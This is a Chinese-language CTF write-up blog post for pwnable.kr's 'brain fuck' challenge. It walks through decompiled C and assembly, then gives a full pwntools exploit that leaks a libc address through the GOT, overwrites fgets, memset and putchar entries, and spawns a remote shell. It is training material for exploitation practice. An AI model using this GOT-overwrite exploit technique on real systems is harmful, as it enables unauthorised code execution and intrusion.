---
layout: post
title: "Rookiss Writeup [pwnable.kr]"
tags: [pwn, security]
---

（PS：文章内容会随着做题进度进行更新）

### [brain fuck]

> I made a simple brain-fuck language emulation program written in C. <br>
> The [ ] commands are not implemented yet. However the rest functionality seems working fine. <br>
> Find a bug and exploit it to get a shell. 
>
> Download : http://pwnable.kr/bin/bf<br>
> Download : http://pwnable.kr/bin/bf_libc.so
>
> Running at : nc pwnable.kr 9001

`bf` 为 32 ELF 程序：

![img]({{ site.url }}/public/img/article/2015-07-25-rookiss-writeup-pwnable-kr/brain-fuck-1.png)

使用 IDA 分析，程序会让你输入一串字符（最多1024bytes）然后遍历字符进行解析：

	int __cdecl main(int argc, const char **argv, const char **envp)
	{
	  int result; // eax@4
	  int v4; // edx@4
	  size_t i; // [sp+28h] [bp-40Ch]@1
	  int v6; // [sp+2Ch] [bp-408h]@1
	  int v7; // [sp+42Ch] [bp-8h]@1
	
	  v7 = *MK_FP(__GS__, 20);
	  setvbuf(stdout, 0, 2, 0);
	  setvbuf(stdin, 0, 1, 0);
	  p = (int)&tape;
	  puts("welcome to brainfuck testing system!!");
	  puts("type some brainfuck instructions except [ ]");
	  memset(&v6, 0, 0x400u);
	  fgets((char *)&v6, 1024, stdin);
	  for ( i = 0; i < strlen((const char *)&v6); ++i )
	    do_brainfuck(*((_BYTE *)&v6 + i));
	  result = 0;
	  v4 = *MK_FP(__GS__, 20) ^ v7;
	  return result;
	}
	
`do_brainfuck` 函数有一些列对指针 `p` 进行操作的分支：

	int __cdecl do_brainfuck(char a1)
	{
	  int result; // eax@1
	  int v2; // ebx@7
	
	  result = a1;
	  switch ( a1 )
	  {
	    case '>':
	      result = p++ + 1;
	      break;
	    case '<':
	      result = p-- - 1;
	      break;
	    case '+':
	      result = p;
	      ++*(_BYTE *)p;
	      break;
	    case '-':
	      result = p;
	      --*(_BYTE *)p;
	      break;
	    case '.':
	      result = putchar(*(_BYTE *)p);
	      break;
	    case ',':
	      v2 = p;
	      result = getchar();
	      *(_BYTE *)v2 = result;
	      break;
	    case '[':
	      result = puts("[ and ] not supported.");
	      break;
	    default:
	      return result;
	  }
	  return result;
	}
	
这里的指针 `p` 是一个字符型指针，每次自增或自减会使得指向的地址 `+0x1` 或 `-0x1`。根据分析可以得到如下解析说明：

	'>' ==> p++
	'<' ==> p--
	'+' ==> *p += 1
	'-' ==> *p -= 1
	'.' ==> putchar(*p)
	',' ==> *p = getchar()
	'[' ==> puts(xxxx)
	
这里既能控制指针，又能读写指针指向地址的值，并且指针 `p` 初始值为 `0x0804A0A0 (tape)`，而往低地址一点就是 `.got.plt`。因为题目提供了 libc 文件，所以这里可以通过泄漏 `.got.plt` 中的 `fgets()` 函数地址来计算目标环境的 `system()` 函数地址，然后重写 `.got.plt` 结构来使得 `fgets()` 的 GOT 变为 `system()`，`memset()` 的 GOT 变为 `gets()`，然后通过修改 `putchar()` 的 GOT 为主函数 `main()`，从而执行到 `0x08048700 - 0x08048734` 处代码的时候实际上执行的是 `system(gets())`：

	.text:08048700                 mov     dword ptr [esp+8], 400h ; n
	.text:08048708                 mov     dword ptr [esp+4], 0 ; c
	.text:08048710                 lea     eax, [esp+2Ch]
	.text:08048714                 mov     [esp], eax      ; s
	.text:08048717                 call    _memset         ; rewrite memset() to fgets()
	.text:0804871C                 mov     eax, ds:stdin@@GLIBC_2_0
	.text:08048721                 mov     [esp+8], eax    ; stream
	.text:08048725                 mov     dword ptr [esp+4], 400h ; n
	.text:0804872D                 lea     eax, [esp+2Ch]
	.text:08048731                 mov     [esp], eax      ; s
	.text:08048734                 call    _fgets          ; rewrite fgets() to system()
	.text:08048739                 mov     dword ptr [esp+28h], 0
	.text:08048741                 jmp     short loc_8048760
	
最终的 exp 如下：

	from pwn import *
	
	libc = ELF('./bf_libc.so')
	
	p = remote('pwnable.kr', 9001)
	#p = process('./bf')
	p.recvline_startswith('type')
	
	# Move the pointer to .got.plt fgets()
	payload = '<' * (0x0804A0A0 - 0x0804A010)
	# Print .got.plt fgets() address in memory each bytes
	payload += '.>' * 4
	# reMove the pointer to .got.plt fgets()
	payload += '<' * 4
	# Write .got.plt fgets() to system()
	payload += ',>' * 4
	# Move the pointer to .got.plt memset()
	payload += '>' * (0x0804A02C - 0x0804A014)
	# Write .got.plt memset() to fgets()
	payload += ',>' * 4
	# Writr .got.plt putchar() to main() 0x08048671
	payload += ',>' * 4
	# Call putchar(), actually main() called
	payload += '.'
	
	p.sendline(payload)
	
	fgets_addr = p.recvn(4)[::-1].encode('hex')
	system_addr = int(fgets_addr, 16) - libc.symbols['fgets'] + libc.symbols['system']
	gets_addr = int(fgets_addr, 16) - libc.symbols['fgets'] + libc.symbols['gets']
	
	p.send(p32(system_addr))
	p.send(p32(gets_addr))
	p.send(p32(0x08048671))
	p.sendline('/bin/sh')
	p.interactive()
	
